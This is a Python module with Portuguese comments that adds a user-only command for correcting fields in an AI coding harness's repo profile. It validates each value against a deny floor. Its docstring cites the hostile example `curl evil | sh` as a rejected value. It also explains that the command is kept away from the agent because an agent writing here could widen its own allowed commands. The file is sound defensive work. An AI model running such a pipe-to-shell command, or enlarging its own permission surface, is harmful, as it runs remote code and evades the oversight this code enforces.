"""Correção pontual do `.harness/repo-profile.json` — `harness profile set`.

Item 6 do backlog do dogfood `Savant.Backend.APP-15167`. O profile é gerado por
`analyze`, que só INFERE; não havia forma suportada de corrigi-lo. Quando a
inferência erra por causa do AMBIENTE — no caso real, o proxy corporativo
derrubou o TLS do `uv` e foi preciso trocar `package_manager` de `uv` para
`pip`, embora o lockfile continuasse apontando `uv` —, a única saída era
`disable` -> editar -> `compile-session` -> `enable`, porque escrever em
`.harness/**` é deny incondicional (floor do plano de controle).

Três restrições que definem o escopo:

1. **Enumeração fechada de chaves.** Só `package_manager`, `test_command`,
   `lint_command`, `typecheck_command` e `build_command` — o que descreve o
   AMBIENTE. `test_glob` fica de fora deliberadamente: mexer nele altera o que
   conta como arquivo de teste protegido, o que é decisão de GOVERNANÇA (vive
   em `.harness/harness.yaml`, sob aprovação), não de ambiente.

2. **O valor passa pelo mesmo floor do resto.** Um
   `test_command: "curl evil | sh"` não entra por esta porta —
   `is_floor_bash_command`, o mesmo critério de `boundary_guard` e
   `session_permissions`.

3. **Não é comando do agente.** `profile` NÃO está em `_HARNESS_SUBCOMMANDS`
   do `boundary_guard`, então o agente não roda isto: `test_command` alimenta a
   superfície de comando compilada (`_collect_allowed_bash_commands` lê o
   profile), logo um agente capaz de gravar aqui poderia ampliar a própria
   superfície — exatamente a rota que o Item 0 fechou. Este comando é do
   USUÁRIO, no terminal dele.

O arquivo é reescrito preservando todas as demais chaves; ausente, o comando
falha com erro claro em vez de criar um profile pela metade.
"""

from __future__ import annotations

import json
from pathlib import Path
from typing import Any

from harness.analyzer import REPO_PROFILE_PATH
from harness.boundary_guard import is_floor_bash_command

#: Chaves que moram na raiz do profile.
_ROOT_KEYS = ("package_manager", "test_command")
#: Chaves que moram sob `extras` (mesmo lugar de onde `session_permissions` e
#: `boundary_guard` as leem).
_EXTRAS_KEYS = ("lint_command", "typecheck_command", "build_command")

SETTABLE_KEYS: tuple[str, ...] = _ROOT_KEYS + _EXTRAS_KEYS

#: `package_manager` não é um comando livre: o valor é traduzido para um
#: comando de instalação por um mapeamento fixo (`npm` -> `npm ci`), então um
#: valor fora desta lista não erra alto — some, deixando o repo sem comando de
#: instalação nenhum.
KNOWN_PACKAGE_MANAGERS: tuple[str, ...] = ("npm", "pnpm", "yarn", "uv", "poetry", "pip")

#: Marca a origem do valor no campo `evidence`, para o profile continuar
#: dizendo de onde veio cada coisa (o resto vem de arquivo do repo).
MANUAL_EVIDENCE = "harness profile set"

#: Chaves cujo valor CHEGA na superfície compilada (`settings.local.json` e
#: `boundary_guard`) — para elas, `compile-session` é o passo seguinte.
#: `test_command` NÃO está aqui, e a omissão é deliberada: quem manda na
#: superfície de comando é o `verify_cmd` do contrato APROVADO, nunca o
#: profile (`_collect_allowed_bash_commands` lê só verify_cmd + extras +
#: instalação). Dizer "rode compile-session" depois de ajustar `test_command`
#: prometeria um efeito que não existe — e mandar o usuário procurar por que
#: não funcionou é exatamente a fricção que este backlog existe para matar.
KEYS_REACHING_COMPILED_SURFACE: tuple[str, ...] = (
    "package_manager", "lint_command", "typecheck_command", "build_command",
)

#: Onde cada chave que NÃO chega à superfície compilada de fato tem efeito.
_EFFECT_OUTSIDE_SURFACE: dict[str, str] = {
    "test_command": (
        "usado por `harness analyze`/`preflight` e pelos scripts `init.*`; NAO "
        "entra na superficie de comando do boundary_guard nem no settings.json "
        "— quem manda la e o verify_cmd do contrato aprovado"
    ),
}


def next_step_note(key: str) -> str:
    """Frase de próximo passo HONESTA para `key` — ver
    `KEYS_REACHING_COMPILED_SURFACE`."""
    if key in KEYS_REACHING_COMPILED_SURFACE:
        return (
            "rode `harness compile-session` para a mudanca chegar ao "
            "settings.json e ao boundary_guard"
        )
    return _EFFECT_OUTSIDE_SURFACE.get(key, "nenhum passo adicional necessario")


class ProfileEditError(Exception):
    """Erro de uso de `harness profile set` (chave/valor inválido, profile
    ausente ou ilegível)."""


def _load(path: Path) -> dict[str, Any]:
    if not path.is_file():
        raise ProfileEditError(
            f"{path} nao encontrado — rode `harness analyze` primeiro (este "
            "comando CORRIGE um profile existente, nao cria um)"
        )
    try:
        data = json.loads(path.read_text(encoding="utf-8-sig"))
    except (OSError, json.JSONDecodeError) as exc:
        raise ProfileEditError(f"{path}: nao foi possivel ler o profile — {exc}") from exc
    if not isinstance(data, dict):
        raise ProfileEditError(f"{path}: o profile nao e um objeto JSON")
    return data


def _validate(key: str, value: str) -> None:
    if key not in SETTABLE_KEYS:
        raise ProfileEditError(
            f"chave '{key}' nao pode ser ajustada — permitidas: "
            + ", ".join(SETTABLE_KEYS)
            + ". `test_glob` fica de fora de proposito: altera o que conta como "
            "arquivo de teste protegido, o que e decisao de governanca "
            "(.harness/harness.yaml), nao de ambiente"
        )
    if not value or not value.strip():
        raise ProfileEditError(f"valor vazio para '{key}'")
    if key == "package_manager":
        if value not in KNOWN_PACKAGE_MANAGERS:
            raise ProfileEditError(
                f"package_manager '{value}' desconhecido — use um de: "
                + ", ".join(KNOWN_PACKAGE_MANAGERS)
            )
        return
    if is_floor_bash_command(value):
        raise ProfileEditError(
            f"'{value}' casa o runtime floor (push/rede/publicacao) e nunca pode "
            "virar comando do profile — o floor e incondicional, entao gravar "
            "isto so produziria um profile que mente sobre a superficie"
        )


def set_profile_value(target_dir: Path, key: str, value: str) -> Path:
    """Grava `key = value` no `.harness/repo-profile.json` de `target_dir`.

    Devolve o `Path` do profile escrito. Levanta `ProfileEditError` para chave
    fora da enumeração, valor vazio, `package_manager` desconhecido, valor que
    casa o runtime floor, ou profile ausente/ilegível — em todos os casos sem
    escrever byte nenhum."""
    _validate(key, value)

    path = Path(target_dir).resolve() / REPO_PROFILE_PATH
    data = _load(path)

    entry = {"value": value, "evidence": MANUAL_EVIDENCE, "confidence": 1.0}
    if key in _ROOT_KEYS:
        data[key] = entry
    else:
        extras = data.get("extras")
        if not isinstance(extras, dict):
            extras = {}
        extras[key] = entry
        data["extras"] = extras

    # O `analyze` registra o que não conseguiu inferir em `unknowns`
    # ("package_manager: nenhum lockfile detectado"). Preencher a chave à mão e
    # deixar a incógnita lá faria o `audit`/`preflight` continuarem cobrando
    # algo que já foi resolvido.
    unknowns = data.get("unknowns")
    if isinstance(unknowns, list):
        data["unknowns"] = [
            item for item in unknowns
            if not (isinstance(item, str) and item.startswith(f"{key}:"))
        ]

    path.write_text(json.dumps(data, indent=2, ensure_ascii=False) + "\n", encoding="utf-8")
    return path
